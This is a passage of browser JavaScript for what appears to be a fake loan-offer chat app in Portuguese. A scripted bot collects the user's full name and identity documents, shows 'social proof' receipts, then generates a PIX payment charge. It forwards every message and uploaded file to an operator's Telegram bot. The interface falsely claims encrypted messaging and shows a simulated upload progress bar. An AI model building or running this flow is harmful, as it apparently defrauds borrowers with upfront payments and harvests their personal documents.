(function () {
  'use strict';

  const state = {
    etapa: 'inicio',
    nome: '',
    conversa: [],
    progresso: 1,
    arquivosPendentes: [],
    theme: 'auto',
    protocol: '',
    timelineEvents: {},
    lastUpdate: null,
    soundEnabled: true,
    vibrationEnabled: true,
    notificationsEnabled: false,
    isSending: false,
    lastSendTime: 0,
    messageCounter: 0,
    telegramMessageIds: {},
    replyTo: null,
    currentClientId: null,
    clientSessions: {},
    pixAtual: null  // 
  };

  const $ = (id) => document.getElementById(id);
  let eventsBound = false;

  const chatBody = $('chatBody');
  const userInput = $('userInput');
  const btnSend = $('btnSend');
  const btnMic = $('btnMic');
  const btnAttach = $('btnAttach');
  const attachMenu = $('attachMenu');
  const fileInput = $('fileInput');
  const typingIndicator = $('typingIndicator');
  const headerStatus = $('headerStatus');
  const btnTheme = $('btnTheme');
  const btnStatus = $('btnStatus');
  const btnMenu = $('btnMenu');
  const btnInstall = $('btnInstall');
  const toast = $('toast');
  const splash = $('splash');
  const app = $('app');
  const quickReplies = $('quickReplies');
  const progressFill = $('progressFill');
  const progressPercent = $('progressPercent');
  const timeline = $('timeline');
  const statusModal = $('statusModal');
  const uploadModal = $('uploadModal');
  const replyPreview = $('replyPreview');
  const replyToName = $('replyToName');
  const replyToContent = $('replyToContent');
  const cancelReply = $('cancelReply');

  function cleanLocalStorage() {
    try {
      const chatState = localStorage.getItem('chat_state');
      if (chatState) {
        const data = JSON.parse(chatState);
        if (data.conversa && data.conversa.length > 50) {
          data.conversa = data.conversa.slice(-50);
          localStorage.setItem('chat_state', JSON.stringify(data));
          localStorage.setItem('chat_state_backup', JSON.stringify(data));
        }
      }
    } catch (e) {
      console.warn('Erro ao limpar localStorage:', e);
    }
  }

  function init() {
    cleanLocalStorage();
    document.documentElement.classList.add('auto');
    $('botName').textContent = window.CONFIG?.botName || 'Pedro';
    if (window.CONFIG?.botPhoto) $('botPhoto').src = window.CONFIG.botPhoto;
    loadState();
    if (!state.protocol) state.protocol = generateProtocol();
    if (!state.currentClientId) {
      state.currentClientId = 'client_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    }
    renderAllMessages();
    updateProgressBar();
    updateTimeline();
    updateStatusCard();
    if (state.conversa.length === 0) {
      startConversation();
    } else {
      showQuickRepliesForStage();
    }
    if (!eventsBound) {
      bindEvents();
      eventsBound = true;
    }
    applyTheme();
    requestNotificationPermission();
    setTimeout(() => { $('splashStatus').textContent = 'Quase lá...'; }, 1500);
    setTimeout(() => {
      splash.style.display = 'none';
      app.classList.remove('hidden');
      setTimeout(scrollToBottom, 100);
    }, 2900);
    setupPWA();
    checkForUpdates();
    startTelegramPolling();
  }

  function saveState() {
    try {
      const data = {
        etapa: state.etapa,
        nome: state.nome,
        conversa: state.conversa.slice(-50),
        progresso: state.progresso,
        arquivosPendentes: state.arquivosPendentes.slice(-5),
        protocol: state.protocol,
        timelineEvents: state.timelineEvents,
        lastUpdate: state.lastUpdate,
        messageCounter: state.messageCounter,
        telegramMessageIds: state.telegramMessageIds,
        currentClientId: state.currentClientId,
        pixAtual: state.pixAtual || null,  // 
        version: '2.1'
      };
      localStorage.setItem('chat_state', JSON.stringify(data));
      localStorage.setItem('chat_state_backup', JSON.stringify(data));
    } catch (e) {
      console.warn('Erro ao salvar:', e);
    }
  }

  function loadState() {
    try {
      let saved = localStorage.getItem('chat_state');
      if (!saved) saved = localStorage.getItem('chat_state_backup');
      if (saved) {
        const data = JSON.parse(saved);
        Object.assign(state, {
          etapa: data.etapa || 'inicio',
          nome: data.nome || '',
          conversa: data.conversa || [],
          progresso: data.progresso || 1,
          arquivosPendentes: data.arquivosPendentes || [],
          protocol: data.protocol || generateProtocol(),
          timelineEvents: data.timelineEvents || {},
          lastUpdate: data.lastUpdate || null,
          messageCounter: data.messageCounter || 0,
          telegramMessageIds: data.telegramMessageIds || {},
          currentClientId: data.currentClientId || null,
          pixAtual: data.pixAtual || null  // 
        });
      }
    } catch (e) {
      console.warn('Erro ao carregar:', e);
    }
  }

  function generateProtocol() {
    const d = new Date();
    const rand = Math.floor(Math.random() * 9000) + 1000;
    return `EMP-${d.getFullYear()}${String(d.getMonth()+1).padStart(2,'0')}${String(d.getDate()).padStart(2,'0')}-${rand}`;
  }

  function nextMessageId() {
    state.messageCounter++;
    return 'msg_' + state.messageCounter + '_' + Date.now();
  }

  function renderAllMessages() {
    chatBody.innerHTML = '';
    const sep = document.createElement('div');
    sep.className = 'date-separator';
    sep.innerHTML = '<span> Mensagens criptografadas • HOJE</span>';
    chatBody.appendChild(sep);
    state.conversa.forEach(msg => appendMessageDOM(msg, false));
    scrollToBottom();
  }

  function appendMessageDOM(msg, animate = true) {
    const div = document.createElement('div');
    div.className = `message ${msg.type}`;
    div.dataset.messageId = msg.id;
    if (msg.telegramMessageId) div.dataset.telegramId = msg.telegramMessageId;
    if (msg.type === 'received') div.dataset.author = msg.author || 'Pedro';
    if (!animate) div.style.animation = 'none';

    const bubble = document.createElement('div');
    bubble.className = 'bubble';

    if (msg.replyTo) {
      const replyBox = document.createElement('div');
      replyBox.className = 'bubble-reply';
      replyBox.innerHTML = `<div class="bubble-reply-name"> ${escapeHtml(msg.replyTo.author || 'Mensagem')}</div> <div class="bubble-reply-text">${escapeHtml(msg.replyTo.text || '')}</div>`;
      bubble.appendChild(replyBox);
    }

    const content = document.createElement('div');
    content.className = 'msg-content';
    content.innerHTML = msg.content;
    bubble.appendChild(content);

    const meta = document.createElement('div');
    meta.className = 'bubble-meta';
    const checkClass = msg.check || 'read';
    meta.innerHTML = `<span>${msg.time}</span> ${msg.type === 'sent' ? `<span class="check ${checkClass}"></span>` : ''}`;
    bubble.appendChild(meta);

    div.appendChild(bubble);
    chatBody.appendChild(div);
    attachSwipeEvents(div);

    if (animate) scrollToBottom(true);
  }

  function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = String(text);
    return div.innerHTML;
  }

  function scrollToBottom(smooth = false) {
    requestAnimationFrame(() => {
      chatBody.scrollTo({ top: chatBody.scrollHeight, behavior: smooth ? 'smooth' : 'auto' });
    });
  }

  function currentTime() {
    const d = new Date();
    return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')}`;
  }

  function currentDateTime() {
    const d = new Date();
    return `${String(d.getHours()).padStart(2,'0')}:${String(d.getMinutes()).padStart(2,'0')} • ${String(d.getDate()).padStart(2,'0')}/${String(d.getMonth()+1).padStart(2,'0')}`;
  }

  function addMessage(content, type = 'received', check = 'read', replyTo = null, author = null) {
    const id = nextMessageId();
    const msg = {
      id,
      content,
      type,
      time: currentTime(),
      check,
      author: author || (type === 'received' ? 'Pedro' : (state.nome || 'Você')),
      replyTo: replyTo,
      clientId: state.currentClientId
    };
    state.conversa.push(msg);
    appendMessageDOM(msg, true);
    saveState();

    if (type === 'received') {
      playMessageSound();
      vibrate([50, 30, 50]);
    } else {
      playSendSound();
      vibrate(30);
      setTimeout(() => markAsRead(msg), 1500);
    }

    state.lastUpdate = currentDateTime();
    updateStatusCard();
    return msg;
  }

  function markAsRead(msg) {
    const idx = state.conversa.indexOf(msg);
    if (idx > -1) {
      state.conversa[idx].check = 'read';
      const msgs = chatBody.querySelectorAll('.message.sent');
      const lastMsg = msgs[msgs.length - 1];
      if (lastMsg) {
        const check = lastMsg.querySelector('.check');
        if (check) check.classList.add('read');
      }
      saveState();
    }
  }

  function showTyping() {
    typingIndicator.classList.remove('hidden');
    headerStatus.textContent = 'digitando...';
    scrollToBottom();
  }

  function hideTyping() {
    typingIndicator.classList.add('hidden');
    headerStatus.textContent = 'online';
  }

  function botReply(content, delay = 1200, replyTo = null) {
    showTyping();
    setTimeout(() => {
      hideTyping();
      addMessage(content, 'received', 'read', replyTo);
    }, delay);
  }

  function attachSwipeEvents(msgElement) {
    let startX = 0, startY = 0;
    let isSwiping = false;
    let isHorizontal = null;

    msgElement.addEventListener('touchstart', (e) => {
      startX = e.touches[0].clientX;
      startY = e.touches[0].clientY;
      isSwiping = false;
      isHorizontal = null;
    }, { passive: true });

    msgElement.addEventListener('touchmove', (e) => {
      const x = e.touches[0].clientX;
      const y = e.touches[0].clientY;
      const dx = x - startX;
      const dy = y - startY;

      if (isHorizontal === null && (Math.abs(dx) > 8 || Math.abs(dy) > 8)) {
        isHorizontal = Math.abs(dx) > Math.abs(dy);
      }

      if (isHorizontal && dx > 10) {
        isSwiping = true;
        msgElement.classList.add('swiping');
        const translate = Math.min(dx, 120);
        msgElement.style.transform = `translateX(${translate}px)`;
        if (translate > 60) msgElement.classList.add('swiped');
        else msgElement.classList.remove('swiped');
      }
    }, { passive: true });

    msgElement.addEventListener('touchend', (e) => {
      if (!isSwiping) {
        msgElement.classList.remove('swiping', 'swiped');
        msgElement.style.transform = '';
        return;
      }

      const endX = e.changedTouches[0].clientX;
      const dx = endX - startX;
      msgElement.classList.remove('swiping');
      msgElement.style.transform = '';

      if (dx > 80) {
        activateReply(msgElement);
      }
      msgElement.classList.remove('swiped');
    });

    msgElement.addEventListener('dblclick', () => activateReply(msgElement));
  }

  function activateReply(msgElement) {
    const msgId = msgElement.dataset.messageId;
    const telegramId = msgElement.dataset.telegramId;
    const author = msgElement.dataset.author || 'Mensagem';
    const contentEl = msgElement.querySelector('.msg-content');
    const text = contentEl ? contentEl.innerText.trim() : '';

    state.replyTo = {
      id: msgId,
      telegramMessageId: telegramId || null,
      author: author,
      text: text.substring(0, 100)
    };

    replyToName.textContent = `Respondendo a ${author}`;
    replyToContent.textContent = state.replyTo.text;
    replyPreview.classList.remove('hidden');
    vibrate(30);
    userInput.focus();
  }

  function cancelReplyAction() {
    state.replyTo = null;
    replyPreview.classList.add('hidden');
  }

  let audioCtx = null;
  function getAudioContext() {
    if (!audioCtx) {
      try { audioCtx = new (window.AudioContext || window.webkitAudioContext)(); }
      catch (e) { return null; }
    }
    return audioCtx;
  }

  function playMessageSound() {
    if (!state.soundEnabled) return;
    const ctx = getAudioContext();
    if (!ctx) return;
    const now = ctx.currentTime;
    [800, 1000].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.frequency.value = freq; osc.type = 'sine';
      gain.gain.setValueAtTime(0, now + i * 0.12);
      gain.gain.linearRampToValueAtTime(0.15, now + i * 0.12 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + i * 0.12 + 0.15);
      osc.start(now + i * 0.12); osc.stop(now + i * 0.12 + 0.15);
    });
  }

  function playSendSound() {
    if (!state.soundEnabled) return;
    const ctx = getAudioContext();
    if (!ctx) return;
    const now = ctx.currentTime;
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain); gain.connect(ctx.destination);
    osc.frequency.value = 600; osc.type = 'sine';
    gain.gain.setValueAtTime(0, now);
    gain.gain.linearRampToValueAtTime(0.1, now + 0.02);
    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.1);
    osc.start(now); osc.stop(now + 0.1);
  }

  function vibrate(pattern) {
    if (!state.vibrationEnabled) return;
    if ('vibrate' in navigator) { try { navigator.vibrate(pattern); } catch (e) {} }
  }

  function startConversation() {
    const msg = window.CONFIG.mensagens.pedirNome();
    state.etapa = 'inicio';
    state.progresso = 1;
    botReply(msg, 800);
    saveState();
    updateProgressBar();
  }

  function processUserInput(text) {
    const now = Date.now();
    if (now - state.lastSendTime < 500) { showToast(' Aguarde um momento...'); return; }
    if (state.isSending) return;

    state.isSending = true;
    state.lastSendTime = now;

    const clean = text.trim().toLowerCase();
    const currentReply = state.replyTo;

    const sentMsg = addMessage(text, 'sent', 'pending', currentReply);
    sendToTelegram(text, currentReply);
    cancelReplyAction();
    quickReplies.classList.add('hidden');

    if (state.etapa === 'inicio') {
      if (clean.length < 3) {
        botReply('Por favor, informe seu <b>nome completo</b>. ', 800);
        state.isSending = false; return;
      }
      state.nome = text.trim();
      state.etapa = 'apresentacao';
      state.progresso = 1;
      markTimelineEvent('cadastro');
      saveState();
      updateProgressBar();
      setTimeout(() => {
        botReply(window.CONFIG.mensagens.apresentacao(state.nome), 1500);
        showQuickRepliesForStage();
      }, 300);
      state.isSending = false; return;
    }

    if (state.etapa === 'apresentacao') {
      if (/^(sim|ok|interesse|quero|pode|claro|yes)$/i.test(clean)) {
        state.etapa = 'prova_social';
        state.progresso = 2;
        saveState(); updateProgressBar();
        setTimeout(() => {
          botReply(window.CONFIG.mensagens.provaSocial(), 1500);
          setTimeout(() => {
            state.etapa = 'documentos';
            saveState();
            botReply(window.CONFIG.mensagens.documentos(state.nome), 2000);
            showQuickRepliesForStage();
          }, 3500);
        }, 300);
      } else if (/n[aã]o|desisto|sair|cancelar/i.test(clean)) {
        state.etapa = 'fim';
        saveState();
        setTimeout(() => botReply(window.CONFIG.mensagens.semInteresse(state.nome), 1500), 300);
      } else {
        setTimeout(() => botReply(window.CONFIG.mensagens.padrao(state.nome), 1000), 300);
      }
      state.isSending = false; return;
    }

    if (state.etapa === 'prova_social') {
      state.isSending = false; return;
    }

    if (state.etapa === 'documentos') {
      if (/^(enviado|feito|pronto|ok|conclu[ií]do)$/i.test(clean)) {
        if (state.arquivosPendentes.length === 0) {
          botReply(' Envie os documentos solicitados antes de continuar. Use o botão .', 1000);
          state.isSending = false; return;
        }
        markTimelineEvent('documentos');
        state.etapa = 'checkout';
        state.progresso = 3;
        saveState(); updateProgressBar();
        setTimeout(() => {
          markTimelineEvent('analise');
          botReply(window.CONFIG.mensagens.checkoutLink(state.nome), 1500);
          //  Gera PIX automaticamente
          setTimeout(() => gerarCobrancaPix(), 2800);
        }, 800);
      } else {
        botReply(' Recebi sua mensagem. Continue enviando os documentos e digite <b>ENVIADO</b> quando concluir.', 1000);
      }
      state.isSending = false; return;
    }

    if (state.etapa === 'checkout') {
      // Se já tem um PIX em andamento, não faz nada
      if (state.pixAtual && state.pixAtual.id) {
        botReply(' Seu PIX já foi gerado. Aguarde o pagamento ou copie o código acima.', 1000);
      } else {
        botReply(' Gerando novo PIX...', 800);
        setTimeout(() => gerarCobrancaPix(), 1000);
      }
      state.isSending = false; return;
    }

    if (state.etapa === 'fim') {
      botReply(' Obrigado pelo contato! Tenha um excelente dia.', 1000);
      state.isSending = false; return;
    }

    botReply(window.CONFIG.mensagens.padrao(state.nome || 'amigo'), 1000);
    state.isSending = false;
  }

  function showQuickRepliesForStage() {
    const replies = {
      'apresentacao': ['Sim, tenho interesse', 'Não tenho interesse'],
      'documentos': ['Enviado', 'Preciso de ajuda'],
      'checkout': ['Já paguei', 'Enviar comprovante']
    };
    const options = replies[state.etapa];
    if (!options || options.length === 0) {
      quickReplies.classList.add('hidden');
      quickReplies.innerHTML = '';
      return;
    }
    quickReplies.innerHTML = '';
    options.forEach(text => {
      const btn = document.createElement('button');
      btn.className = 'quick-reply';
      btn.textContent = text;
      btn.addEventListener('click', () => {
        userInput.value = text;
        btnSend.click();
      });
      quickReplies.appendChild(btn);
    });
    quickReplies.classList.remove('hidden');
  }

  function updateProgressBar() {
    const map = {
      'inicio': 1, 'apresentacao': 1,
      'prova_social': 2, 'documentos': 2,
      'checkout': 3,
      'aguardando_comprovante': 4,
      'fim': 4
    };
    const step = map[state.etapa] || 1;
    state.progresso = step;
    const percent = Math.min(100, Math.round((step / 4) * 100));
    progressFill.style.width = percent + '%';
    progressPercent.textContent = percent + '%';
    document.querySelectorAll('.progress-step').forEach(el => {
      const s = parseInt(el.dataset.step);
      el.classList.remove('active', 'completed');
      if (s < step) el.classList.add('completed');
      else if (s === step) el.classList.add('active');
    });
    document.querySelectorAll('.progress-line').forEach((line, i) => {
      if (i + 1 < step) line.classList.add('filled');
      else line.classList.remove('filled');
    });
    saveState();
  }

  function markTimelineEvent(event) {
    state.timelineEvents[event] = currentDateTime();
    state.lastUpdate = currentDateTime();
    updateTimeline();
    updateStatusCard();
    saveState();
  }

  function updateTimeline() {
    const events = ['cadastro', 'documentos', 'analise', 'pagamento', 'liberacao'];
    const items = document.querySelectorAll('.timeline-item');
    items.forEach((item, i) => {
      const ev = events[i];
      item.classList.remove('completed', 'active');
      if (state.timelineEvents[ev]) {
        item.classList.add('completed');
        const timeEl = item.querySelector('.timeline-time');
        if (timeEl) timeEl.textContent = state.timelineEvents[ev];
      }
    });
    const nextEvent = events.find(ev => !state.timelineEvents[ev]);
    if (nextEvent) {
      const activeItem = document.querySelector(`.timeline-item[data-event="${nextEvent}"]`);
      if (activeItem) activeItem.classList.add('active');
    }
  }

  function updateStatusCard() {
    const statusMap = {
      'inicio': ' Coletando dados',
      'apresentacao': ' Apresentação enviada',
      'prova_social': ' Mostrando comprovantes',
      'documentos': ' Aguardando documentos',
      'checkout': ' Aguardando pagamento',
      'aguardando_comprovante': ' Em análise',
      'fim': ' Finalizado'
    };
    const etaMap = { 1: '~1 minuto', 2: '~3 minutos', 3: '~5 minutos', 4: '~24 horas' };
    $('statusCurrent').textContent = statusMap[state.etapa] || 'Iniciando';
    $('statusLastUpdate').textContent = state.lastUpdate || '—';
    $('statusEta').textContent = etaMap[state.progresso] || '—';
    $('statusProtocol').textContent = state.protocol;
    $('statusClient').textContent = state.nome || 'Aguardando...';
  }

  function handleFile(file) {
    if (!file) return;
    $('uploadFilename').textContent = file.name;
    $('uploadBar').style.width = '0%';
    $('uploadStatus').textContent = 'Preparando...';
    const preview = $('uploadPreview');
    preview.innerHTML = '<div class="file-icon"></div>';
    uploadModal.classList.remove('hidden');

    const isImage = file.type.startsWith('image/');
    if (isImage) {
      $('uploadStatus').textContent = 'Comprimindo imagem...';
      compressImage(file, 0.7, 1280)
        .then(blob => processCompressedFile(blob, file.name, file.type, true))
        .catch(() => processCompressedFile(file, file.name, file.type, false));
    } else {
      processCompressedFile(file, file.name, file.type, false);
    }
  }

  function processCompressedFile(fileOrBlob, originalName, originalType, compressed) {
    const reader = new FileReader();
    let progress = 0;
    const progressInterval = setInterval(() => {
      progress += Math.random() * 15;
      if (progress > 90) progress = 90;
      $('uploadBar').style.width = progress + '%';
      $('uploadStatus').textContent = `Enviando... ${Math.round(progress)}%`;
    }, 150);

    reader.onload = (e) => {
      clearInterval(progressInterval);
      const dataUrl = e.target.result;
      const isImage = originalType.startsWith('image/');
      const isVideo = originalType.startsWith('video/');
      const preview = $('uploadPreview');

      if (isImage) preview.innerHTML = `<img src="${dataUrl}" alt="preview">`;
      else if (isVideo) preview.innerHTML = `<video src="${dataUrl}" controls></video>`;
      else preview.innerHTML = '<div class="file-icon"></div>';

      $('uploadBar').style.width = '100%';
      $('uploadStatus').textContent = compressed ? ' Imagem comprimida e enviada!' : ' Enviado com sucesso!';

      let previewHtml = '';
      if (isImage) previewHtml = `<img src="${dataUrl}" alt="${originalName}">`;
      else if (isVideo) previewHtml = `<video src="${dataUrl}" controls style="max-width:100%; border-radius:8px; margin:6px 0;"></video>`;
      else previewHtml = ` <b>${originalName}</b><br><small>${formatSize(fileOrBlob.size)}</small>`;

      setTimeout(() => {
        addMessage(previewHtml, 'sent');
        state.arquivosPendentes.push({
          name: originalName,
          size: fileOrBlob.size,
          type: originalType,
          data: dataUrl
        });
        saveState();
        sendFileToTelegram(fileOrBlob, originalName);
        uploadModal.classList.add('hidden');
      }, 600);
    };
    reader.readAsDataURL(fileOrBlob);
  }

  function compressImage(file, quality, maxWidth) {
    return new Promise((resolve, reject) => {
      const img = new Image();
      const url = URL.createObjectURL(file);
      img.onload = () => {
        let { width, height } = img;
        if (width > maxWidth) { height = (height * maxWidth) / width; width = maxWidth; }
        const canvas = document.createElement('canvas');
        canvas.width = width; canvas.height = height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0, width, height);
        canvas.toBlob(
          blob => { URL.revokeObjectURL(url); blob ? resolve(blob) : reject(new Error('Falha na compressão')); },
          file.type || 'image/jpeg', quality
        );
      };
      img.onerror = () => { URL.revokeObjectURL(url); reject(new Error('Erro ao carregar imagem')); };
      img.src = url;
    });
  }

  function formatSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
  }

  async function sendToTelegram(text, replyTo = null) {
    const cfg = window.CONFIG;
    if (!cfg.telegramToken || !cfg.telegramChatId) return;
    const payload = {
      chat_id: cfg.telegramChatId,
      text: ` ${text.replace(/<[^>]+>/g, '')}\n Protocolo: ${state.protocol}\n Cliente: ${state.nome || 'N/I'}\n ID: ${state.currentClientId}`,
      parse_mode: 'HTML'
    };
    if (replyTo && replyTo.telegramMessageId) {
      payload.reply_to_message_id = parseInt(replyTo.telegramMessageId);
      payload.allow_sending_without_reply = true;
    }
    try {
      const res = await fetch(`https://api.telegram.org/bot${cfg.telegramToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      const data = await res.json();
      if (data.ok && data.result) {
        const lastMsg = state.conversa[state.conversa.length - 1];
        if (lastMsg && lastMsg.type === 'sent') {
          lastMsg.telegramMessageId = data.result.message_id;
          state.telegramMessageIds[lastMsg.id] = data.result.message_id;
          saveState();
        }
      }
    } catch (e) { console.warn('Erro Telegram:', e); }
  }

  async function sendFileToTelegram(fileOrBlob, fileName) {
    const cfg = window.CONFIG;
    if (!cfg.telegramToken || !cfg.telegramChatId) return;
    try {
      const formData = new FormData();
      formData.append('chat_id', cfg.telegramChatId);
      formData.append('document', fileOrBlob, fileName);
      formData.append('caption', ` Arquivo de ${state.nome || 'cliente'}: ${fileName}\n ${state.protocol}\n ID: ${state.currentClientId}`);
      const res = await fetch(`https://api.telegram.org/bot${cfg.telegramToken}/sendDocument`, {
        method: 'POST', body: formData
      });
      const data = await res.json();
      if (data.ok && data.result) {
        const lastMsg = state.conversa[state.conversa.length - 1];
        if (lastMsg) {
          lastMsg.telegramMessageId = data.result.message_id;
          state.telegramMessageIds[lastMsg.id] = data.result.message_id;
          saveState();
        }
      }
    } catch (e) { console.warn('Erro envio arquivo Telegram:', e); }
  }

  let lastUpdateId = 0;
  let pollingErrorCount = 0;
  let pollingInterval = null;

  async function pollTelegram() {
    const cfg = window.CONFIG;
    if (!cfg.telegramToken) return;
    try {
      const res = await fetch(`https://api.telegram.org/bot${cfg.telegramToken}/getUpdates?offset=${lastUpdateId + 1}&timeout=1`);
      if (!res.ok) {
        pollingErrorCount++;
        if (pollingErrorCount > 10) {
          console.warn('Muitos erros de polling, pausando...');
          if (pollingInterval) { clearInterval(pollingInterval); pollingInterval = null; }
          setTimeout(startTelegramPolling, 30000);
        }
        return;
      }
      const data = await res.json();
      if (!data.ok || !data.result) return;
      pollingErrorCount = 0;
      for (const update of data.result) {
        lastUpdateId = Math.max(lastUpdateId, update.update_id);
        const msg = update.message;
        if (!msg || msg.chat.id.toString() !== cfg.telegramChatId.toString()) continue;
        if (msg.from && msg.from.is_bot) continue;
        const text = msg.text || msg.caption || '[mídia]';
        const clientIdMatch = text.match(/ ID: (client_\d+_[a-z0-9]+)/);
        const messageClientId = clientIdMatch ? clientIdMatch[1] : null;
        if (messageClientId && messageClientId !== state.currentClientId) continue;
        const replyTo = msg.reply_to_message ? {
          id: 'tg_' + msg.reply_to_message.message_id,
          author: 'Você',
          text: (msg.reply_to_message.text || msg.reply_to_message.caption || '').substring(0, 100),
          telegramMessageId: msg.reply_to_message.message_id
        } : null;
        const telegramMsgId = msg.message_id;
        const jaExiste = state.conversa.some(m => m.telegramMessageId === telegramMsgId);
        if (jaExiste) continue;
        addMessage(escapeHtml(text), 'received', 'read', replyTo, 'Operador');
        const lastMsg = state.conversa[state.conversa.length - 1];
        if (lastMsg) {
          lastMsg.telegramMessageId = telegramMsgId;
          state.telegramMessageIds[lastMsg.id] = telegramMsgId;
          saveState();
        }
      }
    } catch (e) {
      pollingErrorCount++;
      console.warn('Erro no polling:', e);
    }
  }

  function startTelegramPolling() {
    if (pollingInterval) return;
    pollingInterval = setInterval(pollTelegram, 3000);
    pollTelegram();
  }

  function requestNotificationPermission() {
    if (!('Notification' in window)) return;
    if (Notification.permission === 'granted') state.notificationsEnabled = true;
  }

  function sendNotification(title, body) {
    if (!state.notificationsEnabled || Notification.permission !== 'granted') return;
    if (location.protocol !== 'https:' && location.hostname !== 'localhost') return;
    try {
      const n = new Notification(title, {
        body, icon: 'imagens/icon-192.png', badge: 'imagens/icon-192.png',
        tag: 'emprestimo-' + Date.now(), vibrate: [200, 100, 200]
      });
      setTimeout(() => n.close(), 6000);
    } catch (e) { console.warn('Erro notificação:', e); }
  }

  function applyTheme() {
    const saved = localStorage.getItem('theme') || 'auto';
    state.theme = saved;
    document.documentElement.classList.remove('auto');
    if (saved === 'dark') document.body.classList.add('dark');
    else if (saved === 'light') document.body.classList.remove('dark');
    else { document.documentElement.classList.add('auto'); document.body.classList.remove('dark'); }
  }

  function toggleTheme() {
    const cycle = { 'auto': 'light', 'light': 'dark', 'dark': 'auto' };
    const next = cycle[state.theme] || 'auto';
    state.theme = next;
    localStorage.setItem('theme', next);
    applyTheme();
    const labels = { auto: ' Automático', light: ' Claro', dark: ' Escuro' };
    showToast(labels[next]);
  }

  function showToast(msg) {
    toast.textContent = msg;
    toast.classList.add('show');
    clearTimeout(showToast._t);
    showToast._t = setTimeout(() => toast.classList.remove('show'), 2500);
  }

  let deferredPrompt = null;
  function setupPWA() {
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('sw.js').then(reg => {
        console.log(' SW registrado');
        reg.addEventListener('updatefound', () => {
          const nw = reg.installing;
          nw.addEventListener('statechange', () => {
            if (nw.state === 'activated') {
              showToast(' Nova versão disponível! Recarregue.');
              sendNotification(' Atualização disponível', 'Uma nova versão do app foi instalada.');
            }
          });
        });
      }).catch(err => console.warn('SW erro:', err));
    }
    window.addEventListener('beforeinstallprompt', (e) => {
      e.preventDefault();
      deferredPrompt = e;
      if (!localStorage.getItem('pwa_installed')) btnInstall.classList.remove('hidden');
    });
    btnInstall.addEventListener('click', async () => {
      if (!deferredPrompt) { showToast('Use o menu do navegador para instalar'); return; }
      deferredPrompt.prompt();
      const { outcome } = await deferredPrompt.userChoice;
      if (outcome === 'accepted') {
        localStorage.setItem('pwa_installed', '1');
        showToast(' Aplicativo instalado!');
      }
      deferredPrompt = null;
      btnInstall.classList.add('hidden');
    });
    window.addEventListener('appinstalled', () => {
      localStorage.setItem('pwa_installed', '1');
      btnInstall.classList.add('hidden');
    });
  }

  function checkForUpdates() {
    setInterval(() => {
      if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
        navigator.serviceWorker.getRegistration().then(reg => { if (reg) reg.update(); });
      }
    }, 5 * 60 * 1000);
  }

  function bindEvents() {
    btnSend.addEventListener('click', () => {
      const text = userInput.value.trim();
      if (!text) return;
      userInput.value = '';
      userInput.focus();
      toggleSendMic();
      processUserInput(text);
    });
    userInput.addEventListener('keydown', (e) => {
      if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); btnSend.click(); }
    });
    userInput.addEventListener('input', toggleSendMic);
    cancelReply.addEventListener('click', cancelReplyAction);
    btnAttach.addEventListener('click', (e) => { e.stopPropagation(); attachMenu.classList.toggle('hidden'); });
    document.addEventListener('click', (e) => {
      if (!attachMenu.contains(e.target) && e.target !== btnAttach) attachMenu.classList.add('hidden');
    });
    document.querySelectorAll('.attach-item').forEach(item => {
      item.addEventListener('click', () => {
        const type = item.dataset.type;
        attachMenu.classList.add('hidden');
        switch (type) {
          case 'image': fileInput.accept = 'image/'; fileInput.click(); break;
          case 'video': fileInput.accept = 'video/'; fileInput.click(); break;
          case 'document': fileInput.accept = '.pdf,.doc,.docx,.txt'; fileInput.click(); break;
          case 'camera':
            fileInput.accept = 'image/';
            fileInput.setAttribute('capture', 'environment');
            fileInput.click();
            fileInput.removeAttribute('capture');
            break;
          case 'audio': fileInput.accept = 'audio/'; fileInput.click(); break;
          case 'location': sendLocation(); break;
          case 'contact': sendContact(); break;
          case 'other': fileInput.accept = '.apk,.zip,.rar'; fileInput.click(); break;
        }
      });
    });
    fileInput.addEventListener('change', (e) => {
      const file = e.target.files[0];
      if (file) handleFile(file);
      fileInput.value = '';
    });
    btnTheme.addEventListener('click', toggleTheme);
    btnStatus.addEventListener('click', () => { updateStatusCard(); statusModal.classList.remove('hidden'); });
    $('closeStatus').addEventListener('click', () => statusModal.classList.add('hidden'));
    statusModal.addEventListener('click', (e) => { if (e.target === statusModal) statusModal.classList.add('hidden'); });
    $('btnNotify').addEventListener('click', async () => {
      if (!('Notification' in window)) { showToast(' Navegador não suporta notificações'); return; }
      const perm = await Notification.requestPermission();
      if (perm === 'granted') {
        state.notificationsEnabled = true;
        showToast(' Notificações ativadas!');
        sendNotification(' Notificações ativadas', 'Você será avisado sobre cada etapa do atendimento.');
      } else showToast(' Notificações bloqueadas');
    });
    btnMenu.addEventListener('click', () => timeline.classList.toggle('expanded'));
    document.body.addEventListener('touchstart', () => {
      const ctx = getAudioContext();
      if (ctx && ctx.state === 'suspended') ctx.resume();
    }, { once: true });
    document.body.addEventListener('click', () => {
      const ctx = getAudioContext();
      if (ctx && ctx.state === 'suspended') ctx.resume();
    }, { once: true });
  }

  function toggleSendMic() {
    if (userInput.value.trim()) {
      btnSend.classList.remove('hidden');
      btnMic.classList.add('hidden');
    } else {
      btnSend.classList.add('hidden');
      btnMic.classList.remove('hidden');
    }
  }

  function sendLocation() {
    if (!navigator.geolocation) { showToast(' Geolocalização não suportada'); return; }
    showToast(' Obtendo localização...');
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        const { latitude, longitude } = pos.coords;
